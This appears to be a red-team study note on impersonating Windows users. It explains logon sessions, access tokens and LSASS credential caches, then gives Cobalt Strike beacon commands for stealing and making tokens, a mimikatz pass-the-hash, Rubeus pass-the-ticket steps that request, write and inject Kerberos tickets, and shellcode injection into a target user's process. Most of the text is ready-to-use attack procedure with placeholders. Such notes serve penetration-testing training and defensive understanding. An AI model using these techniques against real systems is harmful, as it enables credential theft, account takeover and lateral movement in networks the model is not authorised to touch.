tactic for leveraging discovered credentials to assume the identity of the user

login basics:
    logon sessions: created after a user authenticated to a system, used to create an associated access token
                    holds info such as logon id, logon time, logon server, username, SID, and UPN
    access token: this token is what windows checks for access-based decisions, what whoami pulls info from
                  holds info such as token id, token type, ID of logon session, SIDs, integrity, privs, etc.
    credential cache: LSASS stores creds in memory for users with active logon sessions
            windows uses the access token to look up associated logon session and associated credential cache

token impersonation:
    technique where an adversary impersonates another user's access token
    if we have a user's plaintext creds, we can make a token:
        beacon> make_token <domain>\<user> <password>
    if we know of a process that is running as a different user, we can steal a token:
        beacon> steal_token <pid>
    if we wish to stop impersonating a token, we run 'rev2self'
    if we want to store a token for future use:
        beacon> token-store steal <pid>
        beacon> token-store show
        beacon> token-store use <id>
        beacon> token-store remove <id>

pass the hash:
    technique where an adversary leverages an NTLM hash
    if we have a user's NTLM hash, the beacon has built in functionality to impersonate the user's token:
        beacon> pth <domain>\<user> <NTLM>
    if we have a user's NTML hash and want to manually impersonate:
        beacon> mimikatz sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<NTLM> /run:%COMSPEC%
            NOTE: this will return an associated PID
        beacon> steal_token <pid>

pass the ticket:
    technique where an adversary leverages kerberos tickets
    if we have a user's NTLM hash or AES key, we can request a TGT:
        beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<aes_key> /nowrap
    once we have a TGT, we can inject it:
        we must have the ticket in a .kirbi file
            if we have a base64 encoded ticket via rubeus we can write to disk as follows:
                $ticket = "doIFo[...snip...]kNPTQ=="
                [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
        then we want to create a new logon session so we don't impact our active session:
            to create a new logon session:
                beacon> make_token <domain>\<user> FakePass
            validate session was create and we have no active tickets:
                beacon> run klist
            now inject the ticket into the new session:
                beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
        if we want to purge the tickets:
            beacon> kerberos_ticket_purge
    passing the ticket via rubeus:
        we can spawn a hidden process in a new logon session:
            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:<user> /domain:<domain> /password:FakePass
        using the new logon session id and process id, we can utilize the ticket:
            beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:<luid> /ticket:<base64_encoded_ticket>
            beacon> steal_token <pid>

process injection:
    we can inject shellcode directly into a process being run by the target user:
        beacon> inject <pid> <arch> <listener>
        e.g.    inject 5248 x64 http